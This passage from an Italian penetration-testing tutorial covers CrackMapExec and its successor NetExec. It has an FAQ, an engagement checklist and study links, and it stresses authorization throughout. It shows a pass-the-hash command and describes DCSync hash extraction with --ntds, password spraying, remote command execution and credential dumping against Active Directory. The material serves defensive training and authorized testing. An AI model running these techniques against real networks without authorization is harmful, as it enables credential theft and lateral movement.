| Opzioni modulo       | `nxc smb -M MODULO --options`                                          |

***

# FAQ — CrackMapExec e NetExec

## Che cos'è CrackMapExec?

CrackMapExec è un framework storico per enumerazione, validazione delle credenziali e post-exploitation su reti Windows e Active Directory. Ha reso popolare un workflow unificato basato soprattutto su SMB, LDAP, WinRM e MSSQL.

## CrackMapExec funziona ancora?

Le vecchie build possono ancora funzionare in alcuni laboratori, ma il repository originale è archiviato e non mantenuto. Per nuovi ambienti usa NetExec.

## Qual è il sostituto di CrackMapExec?

Il sostituto operativo è [NetExec](https://hackita.it/articoli/netexec), che usa il binario `nxc` e mantiene la stessa filosofia con protocolli, moduli e dipendenze aggiornati.

## Come si installa CrackMapExec nel 2026?

Non è consigliato installare CME per nuovi workflow. Installa NetExec in un ambiente isolato tramite `pipx` dal repository ufficiale oppure usa il pacchetto aggiornato della distribuzione.

## Posso sostituire sempre `crackmapexec` con `nxc`?

Per molti comandi base sì. Kerberos, certificati, moduli, file transfer e output possono però avere sintassi differente. Controlla sempre `nxc <protocollo> --help`.

## Cosa significa `(Pwn3d!)`?

Indica che NetExec ha rilevato privilegi sufficienti per una capacità amministrativa o di esecuzione prevista dal protocollo. Non significa automaticamente Domain Admin né compromissione completa del dominio.

## CrackMapExec supporta Pass-the-Hash?

Sì, storicamente con `-H`. NetExec mantiene il supporto:

```bash
nxc smb TARGET -u Administrator -H NTHASH --local-auth
```

## NetExec supporta Kerberos?

Sì. Usa `-k` con credenziali o `--use-kcache` per usare la ccache indicata da `KRB5CCNAME`.

## Posso autenticarmi con un certificato?

Le versioni moderne di NetExec supportano certificati PFX e PEM su protocolli compatibili. Per scenari AD CS consulta [Certipy](https://hackita.it/articoli/certipy) e la guida [AD CS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

## CrackMapExec è rumoroso?

Dipende dal comando. Un banner scan SMB è meno invasivo di password spraying, command execution, LSASS dump o DCSync. Non esiste un singolo livello di rumore valido per tutto il framework.

## Quali eventi genera il password spraying?

Tipicamente fallimenti 4625 per NTLM/Windows logon e 4771 per errori Kerberos, oltre a telemetria di rete e identity protection. I dettagli dipendono dal protocollo e dalla configurazione di auditing.

## `--users` SMB e LDAP sono equivalenti?

No. SMB può usare RPC/SAMR e restituisce risultati influenzati dalle policy e dai permessi. LDAP interroga Active Directory e consente filtri e attributi più ricchi.

## Quando devo usare `--local-auth`?

Quando la credenziale appartiene al database locale dell'host e non al dominio. È tipico per testare una password amministrativa locale o un hash locale su workstation autorizzate.

## Perché `-x` non funziona anche se l'autenticazione riesce?

Una credenziale valida può non essere amministratore locale. Anche con privilegi, WMI, Task Scheduler, SCM, firewall, UAC o EDR possono impedire il metodo di esecuzione.

## Qual è la differenza tra `wmiexec`, `mmcexec`, `atexec` e `smbexec`?

`wmiexec` usa WMI, `mmcexec` usa DCOM tramite MMC, `atexec` crea un scheduled task e `smbexec` usa un servizio temporaneo. Producono artefatti differenti e possono essere bloccati da controlli diversi.

## Come salvo l'output?

Usa il logging integrato per la singola esecuzione:

```bash
nxc --log output.txt smb TARGET ...
```

Oppure salva l'output del terminale con `tee`:

```bash
nxc smb TARGET ... 2>&1 | tee output.txt
```

Non fare affidamento su `--output` copiato da guide CME datate.

## NetExec può fare DCSync?

Il comando `--ntds` può usare DRSUAPI per ottenere gli hash quando l'identità possiede i diritti necessari. La tecnica sottostante è collegata a [DCSync](https://hackita.it/articoli/dcsync).

## È sicuro usare NetExec in produzione?

Solo con autorizzazione, scope e limiti precisi. Password spraying, dump, command execution e moduli possono causare lockout, alert, accesso a dati sensibili o impatto operativo.

***

# Checklist Operativa

```text
PREPARAZIONE
☐ Scope, subnet e host esclusi verificati
☐ Finestra temporale approvata
☐ Policy lockout e soglie note
☐ Raccolta credenziali autorizzata o vietata chiaramente
☐ Directory di evidenza cifrata predisposta

RICOGNIZIONE
☐ SMB signing e SMBv1 identificati
☐ Domain Controller individuati
☐ Null/guest verificati solo se necessari
☐ Relay target list generata e validata

CREDENZIALI
☐ Dominio e contesto locale distinti
☐ Password spraying con una password per ciclo
☐ Jitter impostato se previsto
☐ --no-bruteforce usato per coppie uno-a-uno
☐ Tentativi fermati in caso di lockout

ENUMERAZIONE
☐ Share e permessi annotati
☐ Utenti, gruppi e computer enumerati
☐ Password policy e PSO controllate
☐ Deleghe, SPN, AS-REP e MAQ verificati
☐ BloodHound raccolto solo con collection autorizzata

LATERAL MOVEMENT
☐ Host con privilegi amministrativi identificati
☐ Metodo di esecuzione scelto consapevolmente
☐ Comando innocuo usato per la prima prova
☐ Nessuna esecuzione fuori scope

CREDENTIAL DUMPING
☐ Autorizzazione esplicita confermata
☐ Dump limitato al minimo necessario
☐ Output cifrato e accessi registrati
☐ Hash, cookie e token rimossi secondo retention

REPORT
☐ Evidenza riproducibile salvata
☐ Impatto separato dalla sola presenza del tool
☐ Prerequisiti e limiti documentati
☐ Mitigazioni concrete associate
```

***

# Risorse e Percorso di Studio Hackita

Per approfondire le tecniche richiamate durante il workflow:

* [NetExec](https://hackita.it/articoli/netexec) — successore moderno e guida operativa completa;
* [Active Directory](https://hackita.it/articoli/active-directory) — architettura, oggetti e attacchi principali;
* [SMB](https://hackita.it/articoli/smb) — protocollo, share, signing e superficie di attacco;
* [NTLM relay](https://hackita.it/articoli/ntlm-relay) — relay, prerequisiti e mitigazioni;
* [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) — autenticazione con hash NT;
* [Kerberoasting](https://hackita.it/articoli/kerberoasting) — service ticket e account SPN;
* [AS-REP Roasting](https://hackita.it/articoli/as-rep-roasting) — account senza pre-autenticazione;
* [BloodHound](https://hackita.it/articoli/bloodhound) — attack path e relazioni AD;
* [DCSync](https://hackita.it/articoli/dcsync) — diritti di replica e impatto;
* [Impacket](https://hackita.it/articoli/impacket) — strumenti Python per protocolli Windows;
* [Evil-WinRM](https://hackita.it/articoli/evilwinrm) — shell interattiva WinRM;
* [porta 389 LDAP](https://hackita.it/articoli/porta-389-ldap) — enumerazione LDAP;
* [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql) — attacco e hardening SQL Server;
* [RBCD](https://hackita.it/articoli/rbcd) — Resource-Based Constrained Delegation;
* [Certipy](https://hackita.it/articoli/certipy) — enumerazione e abuso AD CS.

Fonti primarie esterne da consultare per la sintassi installata:

* repository ufficiale NetExec;
* documentazione ufficiale NetExec Wiki;
* help locale `nxc --help` e `nxc <protocollo> --help`;
* elenco moduli `nxc <protocollo> -L`;
* documentazione Microsoft degli Event ID Windows.

***

# Conclusione

CrackMapExec ha definito il modo moderno di eseguire reconnaissance e post-exploitation su reti Windows: una sintassi coerente per passare dalla scoperta di SMB alla validazione delle credenziali, dall'enumerazione LDAP al lateral movement e, quando autorizzato, alla raccolta di credenziali.

Oggi però il nome **CrackMapExec** va trattato come riferimento storico e keyword legacy. Per i comandi reali usa [NetExec](https://hackita.it/articoli/netexec), verifica ogni flag contro la release installata e non confondere l'automazione con la certezza tecnica: `(Pwn3d!)`, un modulo positivo o un login riuscito sono punti di partenza da contestualizzare, non conclusioni automatiche.

La sequenza professionale resta:

```text
mappa → valida → enumera → dimostra l'impatto minimo → raccogli evidenze → ripristina → mitiga
```

> Usa questi comandi esclusivamente su sistemi di tua proprietà o all'interno di penetration test e laboratori espressamente autorizzati.
